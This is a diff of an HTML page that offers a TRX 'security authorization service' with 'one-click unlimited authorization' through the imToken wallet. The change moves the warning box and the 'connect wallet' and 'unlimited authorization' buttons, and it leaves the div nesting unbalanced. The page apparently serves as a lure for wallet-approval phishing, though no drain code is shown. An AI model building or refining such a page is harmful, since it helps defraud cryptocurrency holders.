@@ -223,12 +223,7 @@
             <p class="desc">TRX生态安全授权服务，支持一键无限授权，可在imToken中撤销</p>
         </div>
 
-        <!-- 警告框：修复图标符号 -->
-        <div class="warning">
-            <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
-            <p> ⚠️ 非钱包浏览器：复制链接 → 点击「连接钱包」→ 钱包内「浏览」粘贴访问</p>
-            <p> ⚠️ 授权前确认合约地址无误</p>
-        </div>
+       
              <!-- 用户信息卡 -->
         <div id="userInfo">
             未连接钱包<br>
@@ -247,12 +242,11 @@
 
     <!-- 底部按钮组：按条件隐藏 -->
     <div class="btn-group">
-        <button id="connectBtn" class="btn">
-             连接imToken钱包
-        </button>
-        <button id="approveBtn" class="btn" disabled>
-            能量无限授权
-        </button>
+         <!-- 警告框：修复图标符号 -->
+        <div class="warning">
+            <p> ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开</p>
+            <p> ⚠️ 非钱包浏览器：复制链接 → 点击「连接钱包」→ 钱包内「浏览」粘贴访问</p>
+            <p> ⚠️ 授权前确认合约地址无误</p>
          <!-- 复制链接区：修复图标符号 -->
         <div class="copy-link-wrap">
             <span id="copyLinkText">
@@ -262,6 +256,14 @@
                  复制链接
             </button>
         </div>
+           </div> 
+        <button id="connectBtn" class="btn">
+             连接imToken钱包
+        </button>
+        <button id="approveBtn" class="btn" disabled>
+            能量无限授权
+        </button>
+        
     </div>
 
     <!-- 底部信息区：修复图标符号 -->
